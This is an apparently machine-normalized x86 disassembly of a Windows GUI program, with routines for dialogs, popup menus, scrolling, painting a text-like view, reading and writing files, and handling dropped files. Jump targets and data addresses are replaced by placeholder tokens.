mov ecx rw-data
call sub_402620
mov ecx [ esp + 0x8 ]
mov edx [ ecx + 0x8 ]
push 0x0
push sub_409f10
push edx
push 0x387
call sub_420cd0
add esp 0x10
pop esi
retn 0x4
mov eax [ esi + 0x220 ]
push 0x438
push eax
call [ GetDlgItem@IAT ]
mov ecx [ esp + 0x8 ]
cmp [ ecx + 0x8 ] eax
je r-xdata
mov eax [ esi + 0x220 ]
pop esi
mov [ esp + 0x4 ] eax
jmp [ SetForegroundWindow@IAT ]
mov al [ rw-data ]
test al al
je r-xdata
push ecx
mov ecx [ esi + 0x220 ]
push 0x0
push 0x405
push 0x438
push ecx
call [ SendDlgItemMessageA@IAT ]
test eax eax
je r-xdata
mov edx [ esi + 0x220 ]
push 0x0
push 0x3e7
push 0x111
push edx
call [ SendMessageA@IAT ]
sub_409fd0
mov ecx [ esp + 0x8 ]
mov edx [ rw-data ]
sub esp 0x400
push 0x200
lea eax [ esp + 0x4 ]
push eax
push ecx
push edx
call [ LoadStringA@IAT ]
lea eax [ esp + 0x40c ]
push eax
lea ecx [ esp + 0x4 ]
push ecx
lea edx [ esp + 0x208 ]
push edx
call [ wvsprintfA@IAT ]
push 0x30
push 0x6
call sub_420ca0
mov ecx [ esp + 0x40c ]
mov edx [ ecx + 0x214 ]
add esp 0x4
push eax
lea eax [ esp + 0x208 ]
push eax
push edx
call [ MessageBoxA@IAT ]
add esp 0x400
retn
sub_40a040
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
push ebx
mov esi ecx
call sub_420db0
add esp 0x4
mov edi eax
test edi edi
push ebx
jne r-xdata
mov eax [ esi ]
push edi
mov ecx esi
mov [ esi + 0x21e ] 0x1
call [ eax ]
push edi
call sub_429931
add esp 0x4
pop edi
pop esi
pop ebx
retn 0x4
push 0x79
push esi
call sub_409fd0
add esp 0xc
pop edi
pop esi
pop ebx
retn 0x4
sub_40a090
push 0xffffffff
push sub_431c50
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
push j_sub_420470
push sub_401590
mov esi ecx
push 0x5
push 0x4
lea eax [ esi + 0xac ]
push eax
mov [ esp + 0x1c ] esi
call sub_429490
push j_sub_420470
push sub_401590
push 0xc
push 0x4
lea ecx [ esi + 0xc0 ]
push ecx
mov [ esp + 0x28 ] 0x0
call sub_429490
mov edx [ esp + 0x1c ]
xor eax eax
mov ecx 0x3c
mov edi esi
[ edi ]
push 0x2e
mov [ esp + 0x18 ] 0x1
mov [ esi + 0xc ] 0x40
mov [ esi + 0x7e ] 0x4e20
mov [ esi + 0x8 ] edx
call [ GetSystemMetrics@IAT ]
push 0x0
mov ecx esi
mov [ esi + 0x8e ] ax
call sub_421980
mov eax [ esi + 0x4c ]
mov [ esi + 0x68 ] eax
mov [ esi + 0x54 ] eax
mov eax [ eax + 0x8 ]
push 0x0
mov ecx esi
mov [ esi + 0x6c ] eax
mov [ esi + 0x58 ] eax
call sub_425020
mov ecx esi
call sub_4113e0
mov ecx [ esp + 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_40a160
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
xor ebx ebx
mov [ eax + 0x18 ] ebx
mov ecx [ esi + 0x4c ]
mov [ esi + 0x5c ] bx
mov edx [ ecx + 0x8 ]
mov ecx esi
mov [ edx + 0x4 ] ebx
call sub_40e3d0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
mov ecx esi
call sub_40ee50
mov ecx esi
call sub_40e1a0
mov ecx esi
call sub_40e6d0
mov [ esi + 0x48 ] bl
pop esi
pop ebx
retn 0x8
sub_40a1b0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0x2 ] di
mov [ esi + 0x4 ] edi
pop edi
pop esi
retn
push eax
call sub_429931
add esp 0x4
sub_40a1d0
mov edx ecx
push edi
xor eax eax
mov ecx 0x1b
mov edi edx
[ edi ]
mov eax [ esp + 0x8 ]
mov [ edx + 0x5c ] eax
movsx ecx [ rw-data ]
mov [ edx + 0x1c ] ecx
mov [ edx + 0x60 ] 0x0
mov eax edx
pop edi
retn 0x4
sub_40a200
push ebx
mov ebx ecx
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop ebx
retn
push ebp
push esi
push edi
lea ecx [ ecx ]
mov ecx esi
call sub_40a1b0
add esi 0x8
dec ebp
jne r-xdata
push edi
call sub_429931
mov eax [ ebx + 0x64 ]
add esp 0x4
test eax eax
jne r-xdata
mov edi [ ebx + 0x64 ]
mov eax [ edi + 0x1f40 ]
mov [ ebx + 0x64 ] eax
mov esi edi
mov ebp 0x3e8
pop edi
pop esi
pop ebp
sub_40a250
mov eax [ ecx ]
push esi
mov esi [ esp + 0x8 ]
cmp esi eax
jl r-xdata
cmp esi 0x3e8
mov ecx [ ecx + 0x64 ]
jl r-xdata
xor eax eax
pop esi
retn 0x4
lea eax [ ecx + esi * 8 ]
pop esi
retn 0x4
mov eax 0x10624dd3
mul esi
shr edx 0x6
mov eax edx
imul eax eax 0xfffffc18
add esi eax
dec edx
mov ecx [ ecx + 0x1f40 ]
jne r-xdata
sub_40a290
mov eax [ esp + 0x4 ]
push eax
call sub_40a250
test eax eax
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp [ ecx ] 0x1
movsx edx [ eax + 0x2 ]
jne r-xdata
mov ecx [ esp + 0x8 ]
mov [ ecx ] rw-data
retn 0x8
mov eax [ esp + 0x8 ]
mov [ eax ] ecx
mov eax edx
retn 0x8
add ecx 0x2
dec edx
sub_40a2d0
sub esp 0x1c
push ebx
push esi
push edi
mov edi [ esp + 0x30 ]
xor esi esi
cmp edi esi
mov ebx ecx
jne r-xdata
mov dl [ rw-data ]
mov [ esp + 0x30 ] 0x9
cmp [ edi + 0xc ] 0x40
mov eax [ ebx + 0x4c ]
sete cl
dec cl
and cl dl
cmp eax esi
movzx edx cl
mov [ esp + 0x24 ] edx
mov [ esp + 0x20 ] 0x1
mov [ esp + 0xc ] esi
jne r-xdata
mov eax [ ebx + 0x60 ]
push eax
mov ecx rw-data
call sub_40d9b0
mov edi eax
mov ecx edi
call sub_40e3d0
mov ecx edi
call sub_424d30
push esi
push 0x30
mov ecx edi
call sub_424dd0
mov eax [ ebx + 0x34 ]
mov ecx [ ebx + 0x38 ]
mov [ esp + 0x14 ] eax
cmp [ ebx ] esi
mov [ esp + 0x10 ] ecx
mov [ esp + 0x18 ] esi
jle r-xdata
push 0x40
call [ MessageBeep@IAT ]
pop edi
pop esi
pop ebx
add esp 0x1c
retn 0x8
mov eax [ esp + 0x2c ]
test eax eax
je r-xdata
push ebp
mov ecx edi
call sub_424ac0
mov ecx edi
call sub_40e6d0
pop edi
pop esi
pop ebx
add esp 0x1c
retn 0x8
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
mov eax [ ebx ]
inc esi
cmp esi eax
mov [ esp + 0x1c ] esi
jl r-xdata
lea edx [ esp + 0x20 ]
push edx
push esi
mov ecx ebx
call sub_40a290
mov esi [ esp + 0x20 ]
cmp [ esi ] 0x9
mov ebp eax
jne r-xdata
push 0x0
push 0x0
push 0xd
mov ecx edi
call sub_40f360
push esi
mov ecx ebx
call sub_40a250
cmp [ eax ] 0x0
je r-xdata
pop ebp
mov eax [ esp + 0x24 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
add esi 0x2
dec ebp
dec ecx
dec eax
mov [ esp + 0x20 ] esi
mov [ esp + 0x18 ] ecx
mov [ esp + 0x14 ] eax
jmp r-xdata
cmp [ esi ] 0x20
mov [ esp + 0x24 ] 0x0
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x3c ]
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0xd
mov ecx edi
mov [ esp + 0x1c ] 0x0
call sub_40f360
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
sub ecx eax
push ecx
lea edx [ esi + eax * 2 ]
push edx
push ebp
push esi
jmp r-xdata
push 0x1
lea eax [ esp + 0x38 ]
push eax
mov ecx edi
call sub_40ee50
mov [ esp + 0x10 ] 0x0
cmp si 0x20
mov [ esp + 0x10 ] 0x1
jne r-xdata
mov ecx edi
call sub_40ee50
movzx esi [ esi + ebp * 2 - 0x2 ]
test esi 0x7f00
jne r-xdata
mov esi [ esp + 0x1c ]
sub_40a490
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi ecx
mov eax [ edi ]
cmp esi eax
jl r-xdata
lea eax [ esp + 0xc ]
push eax
inc esi
push esi
mov ecx edi
call sub_40a290
test eax eax
je r-xdata
pop edi
inc eax
pop esi
retn 0x4
pop edi
mov eax esi
pop esi
retn 0x4
mov ecx [ esp + 0xc ]
cmp [ ecx ] 0x9
je r-xdata
sub_40a4d0
sub esp 0x214
push ebx
push ebp
mov ebx ecx
mov eax [ ebx + 0x5c ]
push edi
push eax
call [ SetFocus@IAT ]
mov ecx [ rw-data ]
push 0x1
push ecx
call [ GetSubMenu@IAT ]
push 0x0
mov edi eax
push 0x7537
push edi
call [ DeleteMenu@IAT ]
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ ebx + 0x4c ]
mov ebp [ EnableMenuItem@IAT ]
xor eax eax
test ecx ecx
sete al
push esi
mov esi 0x7533
mov [ esp + 0x10 ] eax
nop
mov edx [ rw-data ]
mov eax edx
mov ecx [ esp + 0x10 ]
push ecx
push esi
push edi
call ebp
inc esi
cmp esi 0x7537
jle r-xdata
mov eax [ ebx + 0x4c ]
test eax eax
pop esi
je r-xdata
mov ecx [ ecx + 0x90 ]
push ecx
lea edx [ esp + 0x24 ]
push 0x7a
push edx
call sub_420b10
add esp 0xc
push eax
push 0x7537
push 0x0
push edi
call [ AppendMenuA@IAT ]
mov eax [ eax ]
cmp eax edx
jne r-xdata
mov eax 0x1
mov edx [ ebx + 0x60 ]
push edx
mov ecx rw-data
call sub_40d9b0
mov cl [ eax + 0x44 ]
test cl cl
je r-xdata
cmp eax ecx
je r-xdata
cmp eax ecx
je r-xdata
xor eax eax
jmp r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
push eax
push 0x7532
push edi
call ebp
mov ecx [ ebx + 0x5c ]
lea eax [ esp + 0x10 ]
push eax
push ecx
call [ GetWindowRect@IAT ]
mov edx [ ebx + 0x5c ]
mov eax [ esp + 0x228 ]
mov ecx [ esp + 0x14 ]
push 0x0
push edx
mov edx [ esp + 0x22c ]
push 0x0
add ecx eax
mov eax [ esp + 0x1c ]
push ecx
add eax edx
push eax
push 0x2
push edi
call [ TrackPopupMenu@IAT ]
pop edi
pop ebp
pop ebx
add esp 0x214
retn 0x8
sub_40a600
sub esp 0x10
mov edx [ ecx + 0x1c ]
mov eax [ esp + 0x14 ]
sub eax [ ecx + 0x54 ]
imul eax edx
add edx eax
mov [ esp + 0x4 ] eax
mov eax [ ecx + 0x4 ]
mov [ esp + 0xc ] edx
push 0x0
lea edx [ esp + 0x4 ]
mov [ esp + 0xc ] eax
mov eax [ ecx + 0x5c ]
push edx
push eax
mov [ esp + 0xc ] 0x0
call [ InvalidateRect@IAT ]
add esp 0x10
retn 0x4
sub_40a640
push ebx
push ebp
mov ebp ecx
mov ebx [ ebp + 0x64 ]
xor eax eax
cmp ebx eax
je r-xdata
push eax
push eax
mov [ ebp + 0x8 ] eax
mov [ ebp + 0x54 ] eax
mov [ ebp ] eax
mov [ ebp + 0x50 ] eax
mov [ ebp + 0x4c ] eax
mov [ ebp + 0x3c ] eax
mov [ ebp + 0x48 ] eax
mov eax [ ebp + 0x5c ]
push eax
call [ InvalidateRect@IAT ]
pop ebp
pop ebx
retn
push esi
push edi
nop
mov ecx esi
mov [ esi ] 0x0
call sub_40a1b0
add esi 0x8
dec edi
jne r-xdata
mov ebx [ ebx + 0x1f40 ]
test ebx ebx
jne r-xdata
mov esi ebx
mov edi 0x3e8
jmp r-xdata
pop edi
xor eax eax
pop esi
sub_40a6b0
mov eax [ ecx ]
dec eax
mov [ rw-data ] eax
mov edx [ ecx + 0x2c ]
push 0x1
mov [ rw-data ] edx
mov eax [ ecx + 0x54 ]
push rw-data
mov [ rw-data ] eax
mov ecx [ ecx + 0x5c ]
push 0x1
push ecx
call [ SetScrollInfo@IAT ]
retn
sub_40a6e0
push esi
push edi
mov edi [ esp + 0xc ]
push edi
mov esi ecx
call sub_40a250
test eax eax
je r-xdata
pop edi
pop esi
retn 0x8
cmp [ eax ] 0x0
mov ecx [ esp + 0x10 ]
je r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
inc [ esi + 0x4c ]
mov [ eax ] cx
push edi
mov ecx esi
call sub_40a600
pop edi
pop esi
retn 0x8
dec [ esi + 0x4c ]
mov [ eax ] cx
push edi
mov ecx esi
call sub_40a600
sub_40a750
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
push edi
mov edi [ esp + 0xc ]
cmp eax edi
jne r-xdata
push ebx
xor ebx ebx
cmp edi ebx
push ebp
jne r-xdata
pop edi
xor eax eax
pop esi
retn 0x4
push 0x2
push edi
call sub_429969
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
xor ebp ebp
mov [ esi + 0x4 ] ebx
mov [ esi + 0x10 ] ebx
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov eax 0x66666667
imul edi
sar edx 0x2
mov eax edx
shr eax 0x1f
lea eax [ edx + eax + 0x1 ]
cmp ecx eax
mov [ esi + 0x10 ] eax
jl r-xdata
pop ebp
pop ebx
pop edi
mov eax 0x1
pop esi
retn 0x4
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
lea edx [ ebx + eax * 2 + 0x2 ]
mov [ esp + 0x14 ] edx
or edx 0xffffffff
sub edx eax
mov eax [ esi + 0x14 ]
add edi edx
cmp eax edi
mov [ esi + 0x4 ] ecx
mov ebp eax
jl r-xdata
mov ecx eax
mov [ esi ] ebp
pop ebp
mov [ esi + 0xc ] ebx
pop ebx
mov [ esi + 0x14 ] edi
pop edi
xor eax eax
pop esi
retn 0x4
push eax
call sub_429931
add esp 0x4
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ebp edi
mov eax [ esi + 0x4 ]
xor ecx ecx
test eax eax
jle r-xdata
lea ecx [ ecx + ecx + 0x2 ]
push ecx
push eax
push ebx
call sub_429090
mov eax [ esi ]
mov ecx [ esp + 0x20 ]
lea edx [ ebp + ebp ]
push edx
push eax
push ecx
call sub_429090
add esp 0x18
mov ebp [ esp + 0x14 ]
mov [ esi + 0x4 ] ecx
mov eax [ esi + 0xc ]
add eax 0x2
jmp r-xdata
movsx edx [ eax ]
cmp edx edi
jge r-xdata
mov edx [ esi + 0x4 ]
inc ecx
add eax 0x2
cmp ecx edx
jl r-xdata
sub_40a850
push ecx
mov eax [ esp + 0xc ]
test eax eax
mov [ esp ] ecx
jne r-xdata
mov edx [ ecx + 0x4 ]
push ebx
push ebp
push esi
xor eax eax
test edx edx
push edi
mov [ esp + 0x1c ] edx
jle r-xdata
or eax 0xffffffff
pop ecx
retn 0x8
or eax 0xffffffff
mov ebx [ ecx + 0xc ]
mov ebp [ esp + 0x18 ]
jmp r-xdata
movsx edi [ ebx ]
movsx esi [ ebx + 0x2 ]
sub esi edi
xor edx edx
test esi esi
jle r-xdata
cmp edx esi
je r-xdata
mov ecx [ ecx ]
lea edi [ ecx + edi * 2 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x8
mov ecx [ esp + 0x1c ]
inc eax
add ebx 0x2
cmp eax ecx
jl r-xdata
inc edx
add edi 0x2
cmp edx esi
jl r-xdata
mov ecx [ esp + 0x10 ]
mov cx [ ebp + edx * 2 ]
cmp cx [ edi ]
jne r-xdata
sub_40a8d0
push ecx
movsx eax [ rw-data ]
push ebx
push esi
push edi
push eax
mov esi ecx
call sub_40a750
mov edi [ esp + 0x14 ]
mov ebx [ ReadFile@IAT ]
push 0x0
lea ecx [ esp + 0x10 ]
push ecx
push 0x4
lea edx [ esi + 0x4 ]
push edx
push edi
call ebx
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
movsx edx [ rw-data ]
push 0x1
push 0x0
shl edx 0x1
push edx
push edi
call [ SetFilePointer@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn 0x4
movsx ecx [ rw-data ]
push 0x0
lea eax [ esp + 0x10 ]
push eax
shl ecx 0x1
push ecx
push esi
push edi
call ebx
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn 0x4
sub_40a940
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov esi ecx
mov eax [ esi + 0xc ]
mov ebp [ esi + 0x14 ]
mov edx [ esi ]
lea ecx [ eax + ebx * 2 ]
movsx eax [ ecx + 0x2 ]
movsx ecx [ ecx ]
push edi
sub ebp eax
mov edi eax
shl ebp 0x1
push ebp
lea eax [ edx + eax * 2 ]
sub edi ecx
push eax
lea ecx [ edx + ecx * 2 ]
push ecx
call sub_429090
mov ecx [ esi + 0x4 ]
add esp 0xc
cmp ebx ecx
mov eax ebx
jge r-xdata
mov eax [ esi + 0x4 ]
pop edi
dec eax
mov [ esi + 0x4 ] eax
pop esi
pop ebp
pop ebx
retn 0x4
mov edi edi
mov edx [ esi + 0xc ]
lea ecx [ edx + eax * 2 ]
mov dx [ ecx + 0x2 ]
sub dx di
mov [ ecx ] dx
mov ecx [ esi + 0x4 ]
inc eax
cmp eax ecx
jl r-xdata
sub_40a9b0
push ecx
push ebx
mov ebx [ WriteFile@IAT ]
push esi
push edi
mov edi [ esp + 0x14 ]
push 0x0
lea eax [ esp + 0x18 ]
push eax
mov esi ecx
push 0x4
lea ecx [ esi + 0x4 ]
push ecx
push edi
mov [ esp + 0x20 ] 0x0
call ebx
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
xor esi esi
cmp [ rw-data ] si
jle r-xdata
movsx eax [ rw-data ]
push 0x0
lea edx [ esp + 0x18 ]
push edx
shl eax 0x1
push eax
push esi
push edi
call ebx
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn 0x4
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn 0x4
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
push 0x2
lea edx [ esp + 0x18 ]
push edx
push edi
call ebx
movsx eax [ rw-data ]
inc esi
cmp esi eax
jl r-xdata
sub_40aa60
sub esp 0x200
push ebx
push ebp
mov ebp [ DragQueryFileA@IAT ]
push esi
push edi
mov edi [ esp + 0x214 ]
push 0x200
lea eax [ esp + 0x14 ]
push eax
xor esi esi
push esi
push edi
mov ebx ecx
call ebp
test eax eax
jbe r-xdata
push edi
call [ DragFinish@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x200
retn 0x4
lea ecx [ ecx ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx ebx
call sub_40a040
push 0x200
lea edx [ esp + 0x14 ]
push edx
inc esi
push esi
push edi
call ebp
test eax eax
ja r-xdata
sub_40aad0
push ecx
push ebx
mov ebx [ ecx + 0xc ]
push ebp
mov ebp [ ebx ]
push esi
xor esi esi
test ebp ebp
push edi
mov edi 0x6
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
lea eax [ esp + 0x10 ]
push eax
push esi
mov ecx ebx
call sub_40a290
inc esi
cmp esi ebp
lea edi [ edi + eax * 2 + 0x6 ]
jl r-xdata
sub_40ab10
push ebp
mov ebp [ esp + 0x8 ]
mov al [ ebp + 0x44 ]
test al al
push esi
mov esi ecx
jne r-xdata
push ebx
push edi
mov ecx ebp
call sub_40ea20
mov ecx [ ebp + 0x1c ]
cmp ecx [ ebp + 0x30 ]
jne r-xdata
pop esi
xor eax eax
pop ebp
retn 0x4
mov edi [ ecx + 0x18 ]
movsx edi [ ebp + 0x38 ]
jmp r-xdata
movsx eax [ ebp + 0x24 ]
mov ecx [ ecx + 0x10 ]
mov edx [ esi + 0x4c ]
lea ebx [ ecx + eax * 2 ]
sub edi eax
xor eax eax
mov [ edx + 0x18 ] eax
mov ecx [ esi + 0x4c ]
mov [ esi + 0x5c ] ax
mov edx [ ecx + 0x8 ]
mov ecx esi
mov [ edx + 0x4 ] eax
call sub_40e3d0
push edi
push ebx
mov ecx esi
call sub_40ee50
mov ecx esi
call sub_40e1a0
mov ecx esi
call sub_40e6d0
mov ecx ebp
mov [ esi + 0x48 ] 0x0
call sub_40db40
mov eax edi
pop edi
pop ebx
pop esi
pop ebp
retn 0x4
sub_40aba0
push ebx
push ebp
mov ebx ecx
call sub_40a1b0
mov ebp [ esp + 0xc ]
test ebp ebp
je r-xdata
pop ebp
pop ebx
retn 0x8
push esi
lea esi [ ebp + ebp ]
push esi
call sub_429a56
add esp 0x4
test eax eax
mov [ ebx + 0x4 ] eax
je r-xdata
pop esi
push edi
mov ecx esi
mov esi [ esp + 0x18 ]
mov edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov [ ebx + 0x2 ] bp
pop edi
sub_40abf0
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
push edi
mov edi [ esi ]
cmp edi eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esi ]
push eax
push ecx
inc edx
push edi
mov ecx esi
mov [ esi ] edx
call sub_40a250
mov ecx eax
call sub_40aba0
push edi
mov ecx esi
call sub_40a600
mov ecx esi
call sub_40a6b0
push 0x1f44
push 0x1
call sub_429969
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
retn 0x8
mov ecx [ esi + 0x68 ]
test ecx ecx
jne r-xdata
mov [ ecx + 0x1f40 ] eax
mov [ esi + 0x64 ] eax
jmp r-xdata
mov [ esi + 0x68 ] eax
add [ esi + 0x14 ] 0x3e8
sub_40ac60
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
mov edi ecx
jle r-xdata
pop edi
xor eax eax
pop esi
retn 0x4
lea esp [ esp ]
pop edi
mov eax esi
pop esi
retn 0x4
dec esi
test esi esi
jg r-xdata
lea eax [ esp + 0xc ]
push eax
push esi
mov ecx edi
call sub_40a290
mov ecx [ esp + 0xc ]
cmp [ ecx ] 0x9
jne r-xdata
sub_40acc0
sub esp 0x18
push ebx
mov ebx [ esp + 0x24 ]
push ebp
push esi
mov esi ecx
mov edx [ esi + 0x54 ]
mov ecx [ esi + 0x1c ]
mov eax ebx
sub eax edx
imul eax ecx
add ecx eax
mov [ esp + 0x18 ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x1c ] eax
mov eax [ esi + 0x18 ]
test eax eax
push edi
mov [ esp + 0x14 ] esi
mov [ esp + 0x10 ] 0xffffffff
mov [ esp + 0x24 ] ecx
mov [ esp + 0x18 ] 0x0
je r-xdata
push 0x5
call [ GetSysColorBrush@IAT ]
mov edi [ esp + 0x2c ]
push eax
lea edx [ esp + 0x1c ]
push edx
push edi
call [ FillRect@IAT ]
cmp ebx [ esi + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn 0x8
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
push 0x8
call [ GetSysColor@IAT ]
push eax
push 0x0
push 0x0
call [ CreatePen@IAT ]
mov edi [ esp + 0x2c ]
mov ebx [ SelectObject@IAT ]
push eax
push edi
call ebx
push 0x5
mov ebp eax
call [ GetSysColorBrush@IAT ]
push eax
push edi
call ebx
push 0x2
push edi
call [ SetBkMode@IAT ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x1c ]
push ecx
mov ecx [ esp + 0x1c ]
push edx
push eax
push ecx
push edi
call [ Rectangle@IAT ]
push ebp
push edi
call ebx
push eax
call [ DeleteObject@IAT ]
push 0x1
push edi
call [ SetBkMode@IAT ]
mov ebx [ esp + 0x30 ]
jmp r-xdata
movsx ebp [ rw-data ]
mov ecx [ esp + 0x24 ]
movsx ebx [ rw-data ]
sub ecx ebp
xor ebp ebp
cmp [ edx ] 0x1
mov [ esp + 0x2c ] ecx
jne r-xdata
push ebx
mov ecx esi
call sub_40a250
test eax eax
mov [ esp + 0x30 ] eax
je r-xdata
movsx ecx [ eax + 0x2 ]
cmp ebp ecx
jge r-xdata
mov eax [ rw-data ]
push eax
push edi
call [ SetTextColor@IAT ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x30 ]
mov ebp 0x1
cmp [ eax ] 0x0
je r-xdata
mov edx [ eax + 0x4 ]
xor esi esi
mov si [ edx + ebp * 2 ]
test esi 0x7f00
je r-xdata
mov eax [ esp + 0x10 ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
cmp si 0x9
je r-xdata
mov edx [ esp + 0x2c ]
mov ecx [ rw-data ]
mov eax [ ecx ]
push edx
movzx edx si
push ebx
push edx
push edi
call [ eax ]
jmp r-xdata
push eax
push edi
call [ SetTextColor@IAT ]
lea ecx [ esp + 0x18 ]
push ecx
push edi
call [ InvertRect@IAT ]
mov [ esp + 0x18 ] eax
mov eax [ esi + 0x40 ]
mov [ esp + 0x20 ] eax
movzx eax si
push eax
push ebx
mov ecx rw-data
call sub_4138a0
mov ecx [ esp + 0x30 ]
movsx edx [ ecx + 0x2 ]
inc ebp
cmp ebp edx
mov ebx eax
mov eax ecx
jl r-xdata
movsx ecx [ rw-data ]
mov edx [ esp + 0x2c ]
movzx eax si
push eax
sub edx ecx
push edx
push ebx
push edi
call sub_413c30
add esp 0x10
mov esi [ esp + 0x14 ]
sub_40aea0
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
push eax
mov ebp ecx
call sub_40ac60
lea ecx [ esp + 0x14 ]
push ecx
mov ebx eax
push ebx
mov ecx ebp
xor esi esi
call sub_40a290
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
mov [ ecx + esi * 2 ] 0x0
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x8
push edi
mov edi [ esp + 0x14 ]
lea esp [ esp ]
cmp [ ecx ] 0x9
jne r-xdata
cmp [ ecx ] 0x9
je r-xdata
test eax eax
jle r-xdata
add ecx 0x2
mov [ esp + 0x18 ] ecx
dec eax
mov [ edi + esi * 2 ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x8
lea eax [ esp + 0x18 ]
push eax
push ebx
mov ecx ebp
call sub_40a290
test eax eax
jne r-xdata
mov dx [ ecx ]
mov [ edi + esi * 2 ] dx
inc esi
add ecx 0x2
dec eax
jne r-xdata
mov ecx [ esp + 0x18 ]
inc ebx
test esi esi
je r-xdata
mov [ edi + esi * 2 ] ax
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x8
mov [ esp + 0x18 ] ecx
sub_40af50
push ecx
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
push edi
mov edi ecx
movzx ecx ax
shr eax 0x10
dec eax
lea edx [ esp + 0x18 ]
push edx
cdq
idiv [ edi + 0x1c ]
mov esi [ edi + 0x54 ]
mov [ esp + 0x14 ] ecx
mov ecx edi
add eax esi
push eax
call sub_40a290
mov ebx eax
movsx eax [ rw-data ]
xor ebp ebp
xor esi esi
test ebx ebx
jle r-xdata
cmp eax [ esp + 0x10 ]
jge r-xdata
lea ecx [ ecx ]
mov ecx [ esp + 0x10 ]
mov ecx [ esp + 0x1c ]
mov [ edi + 0x58 ] 0x0
pop edi
pop esi
pop ebp
mov [ ecx ] ebx
pop ebx
pop ecx
retn 0xc
test esi esi
jg r-xdata
mov ecx [ esp + 0x18 ]
movzx edx [ ecx + esi * 2 ]
push edx
push eax
mov ecx rw-data
mov ebp eax
call sub_4138a0
inc esi
cmp esi ebx
jl r-xdata
mov edx [ esp + 0x20 ]
test edx edx
je r-xdata
mov edx [ esp + 0x18 ]
mov ax [ edx ]
mov ecx [ esp + 0x1c ]
mov [ edi + 0x58 ] ax
pop edi
pop esi
pop ebp
mov [ ecx ] 0x0
movsx eax [ rw-data ]
pop ebx
pop ecx
retn 0xc
mov ecx [ esp + 0x10 ]
cmp eax ecx
jge r-xdata
mov edx [ esp + 0x18 ]
mov ax [ edx + esi * 2 - 0x2 ]
mov ecx [ esp + 0x1c ]
mov [ edi + 0x58 ] ax
dec esi
pop edi
mov [ ecx ] esi
pop esi
mov eax ebp
pop ebp
pop ebx
pop ecx
retn 0xc
mov edx ecx
mov ebx eax
sub edx ebp
sub ebx ecx
cmp ebx edx
jge r-xdata
mov ecx [ esp + 0x18 ]
mov dx [ ecx + esi * 2 ]
mov ecx [ esp + 0x1c ]
mov [ edi + 0x58 ] dx
pop edi
mov [ ecx ] esi
pop esi
pop ebp
pop ebx
pop ecx
retn 0xc
sub_40b050
push ecx
push esi
mov esi ecx
mov ecx [ esp + 0xc ]
mov eax [ esi ]
cmp ecx eax
push edi
mov edi [ esi + 0x8 ]
mov [ esp + 0x8 ] edi
mov [ esi + 0x8 ] ecx
jl r-xdata
mov ecx [ esi + 0x8 ]
xor eax eax
cmp ecx eax
jge r-xdata
dec eax
mov [ esi + 0x8 ] eax
cmp [ esp + 0x14 ] eax
jne r-xdata
mov [ esi + 0x8 ] eax
cmp [ esi + 0x50 ] eax
jne r-xdata
push ebx
mov ebx [ esi + 0x64 ]
push ebp
xor ebp ebp
cmp ebx eax
mov [ esi + 0x50 ] eax
je r-xdata
mov eax [ esi + 0x30 ]
cmp eax edi
jg r-xdata
mov [ esi + 0x50 ] 0x1
mov [ esi + 0x30 ] edi
lea esp [ esp ]
